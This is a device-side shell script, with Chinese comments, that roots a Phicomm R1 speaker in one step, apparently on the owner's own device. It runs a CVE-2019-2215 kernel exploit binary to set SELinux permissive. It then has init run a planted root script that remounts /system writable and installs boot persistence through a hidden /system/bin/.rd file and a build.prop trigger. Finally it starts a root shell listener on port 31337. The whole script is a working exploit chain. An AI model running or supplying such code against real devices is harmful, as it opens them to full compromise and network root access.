#!/system/bin/sh
# Phicomm R1 一键 root（含开机持久化）—— 设备端部分
# 必须以 uid1000（system_app）身份执行（通过 IJetty / ProductionTest echo_test）
# 用法: onkey.sh [文件目录] [rootd端口]
#   目录中需要 exp2224 / exp_boot / rootd / su / persist.sh（由 onkey.ps1 推送）
#
# 流程：
#   1) 利用 CVE-2019-2215 向 selinux_enforcing 写 0 -> Permissive
#   2) setprop ctl.start cifsmanager -> init(root) 执行 /data/etc/cifsmanager.sh
#      -> 安装开机持久化（persist.sh）
#      -> 把 /system 重新挂载为可写并保持
#      -> 结果写入 /cache/r1_status（应用命名空间看不到真实挂载状态）
#      -> 拉起 rootd
#   3) 轮询校验 :31337、持久化标记、/cache/r1_status = RW_OK

D="${1:-/sdcard/r1root}"
PORT="${2:-31337}"

echo "[*] files=$D port=$PORT"

# 1) 暂存 root 阶段要用的文件到 /cache（uid1000 只能写文件，不能建目录）
for f in rootd exp_boot su persist.sh; do
    cp "$D/$f" "/cache/$f" || { echo "[-] cp $f failed"; exit 1; }
done
chmod 755 /cache/rootd /cache/exp_boot /cache/su
rm -f /cache/r1_status 2>/dev/null

# 2) 放置利用程序（/data/system 对 uid1000 可执行）
mkdir -p /data/etc || exit 1
cp "$D/exp2224" /data/system/exp2224 || exit 1
chmod 755 /data/system/exp2224

# 3) init 服务的 root 脚本：持久化 -> /system rw -> 状态文件 -> rootd
{
    echo '#!/system/bin/sh'
    echo 'sh /cache/persist.sh /cache >>/cache/persist.log 2>&1'
    echo 'chmod 644 /cache/persist.log 2>/dev/null'
    echo 'mount -o remount,rw /system 2>>/cache/persist.log'
    echo 'if mount | grep " /system " | grep -q rw; then echo RW_OK > /cache/r1_status; else echo RW_FAIL > /cache/r1_status; fi'
    echo 'chmod 644 /cache/r1_status 2>/dev/null'
    echo "/cache/rootd $PORT &"
    echo 'exit 0'
} > /data/etc/cifsmanager.sh
chmod 755 /data/etc/cifsmanager.sh

# 4) CVE-2019-2215：任意内核写 -> selinux_enforcing = 0
echo "[*] exploiting (selinux_enforcing -> 0) ..."
/data/system/exp2224 c0f7fb0c 0
echo "[*] selinux: $(getenforce)"

# 5) 让 init(root) 执行 cifsmanager.sh（持久化 + /system rw + rootd）
setprop ctl.start cifsmanager

# 6) 轮询校验（最多 ~25 秒）
wait_for() {
    i=0
    while [ $i -lt 25 ]; do
        if eval "$1"; then return 0; fi
        sleep 1
        i=$((i+1))
    done
    return 1
}

RC=0
if wait_for "netstat -ltn 2>/dev/null | grep -q ':$PORT'"; then
    echo "[+] root shell: :$PORT (uid=0)"
else
    echo "[-] no listener on :$PORT (selinux 未变成 Permissive?)"
    RC=2
fi

if wait_for "[ -f /system/bin/.rd ] && grep -q '^sys.rksmbd.start=1' /system/build.prop"; then
    echo "[+] persistence installed: /system/bin/.rd + build.prop trigger"
else
    echo "[-] persistence NOT installed, log:"
    cat /cache/persist.log 2>/dev/null
    RC=3
fi

if wait_for "grep -q RW_OK /cache/r1_status 2>/dev/null"; then
    echo "[+] /system is mounted read-write"
else
    echo "[-] /system is NOT read-write (see /cache/persist.log)"
    RC=4
fi

echo "[*] done (rc=$RC)"
exit $RC
